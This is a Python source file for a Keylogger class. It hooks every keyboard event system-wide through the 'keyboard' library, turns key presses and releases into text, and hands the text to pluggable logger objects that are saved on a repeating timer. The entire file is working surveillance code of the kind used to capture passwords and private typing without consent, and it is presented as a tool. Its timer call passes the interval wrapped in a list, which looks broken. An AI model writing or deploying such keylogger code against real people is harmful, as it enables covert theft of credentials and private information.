import threading
import time

import keyboard

import logger


class Keylogger:
    def __init__(self):
        self.__loggers = []
        self.__timer = None

        # log each key pressed
        keyboard.hook(callback=self._on_event)
        
    def attach_logger(self, logger: logger.AbstractLogger):
        self.__loggers.append(logger)
        logger.on_attached()
        return self

    def detach_logger(self, logger: logger.AbstractLogger):
        self.__loggers.remove(logger)
        logger.on_detached()
        return self

    def save_each(self, seconds: int):
        # save each attached logger
        for logger in self.__loggers:
            logger.save()

        # call this function again in `seconds` seconds
        self.__timer = threading.Timer(interval=seconds, function=self.save_each, args=[[seconds]])
        self.__timer.daemon = True     # set the thread as daemon (dies when main thread dies)
        self.__timer.start()

        return self
    
    def wait(self):
        try:
            while True:
                time.sleep(1e6)
        except Exception as e:
            self.log_object(e)
            self.stop()
        except KeyboardInterrupt:
            self.stop()

    def stop(self, *_):
        if self.__timer:
            self.__timer.cancel()

        for logger in self.__loggers:
            logger.close()

    def _on_event(self, event: keyboard.KeyboardEvent):
        if event.event_type == 'down':
            self._on_keypress(event)
        else:
            self._on_keyrelease(event)

    def _on_keypress(self, event: keyboard.KeyboardEvent):
        name = event.name
        
        # regular character
        if len(name) == 1:
            self.log_key(name)
            return

        # not a character, special key (e.g ctrl, alt, etc.)
        if name == 'space':
            # ' ' instead of 'space'
            self.log_key(' ')
        elif name == 'enter':
            # add a new line whenever an ENTER is pressed
            self.log_key('[ENTER]\n')
        elif name == 'decimal':
            self.log_key('.')
        else:
            # replace spaces with underscores
            self.log_key('[{}]'.format(name.replace(' ', '_').upper()))

    def _on_keyrelease(self, event: keyboard.KeyboardEvent):
        name = event.name

        # skip regular letters
        if len(name) == 1:
            return
        if name in ['space', 'enter']:
            return

        self.log_key('[{}-RELEASE]'.format(name.replace(' ', '_').upper()))

    def log_key(self, text: str):
        for logger in self.__loggers:
            logger.log(text)

    def log_object(self, o):
        for logger in self.__loggers:
            logger.log('\n----- Object start -----\n')
            logger.log(str(o))
            logger.log('\n----- Object end -----\n')
    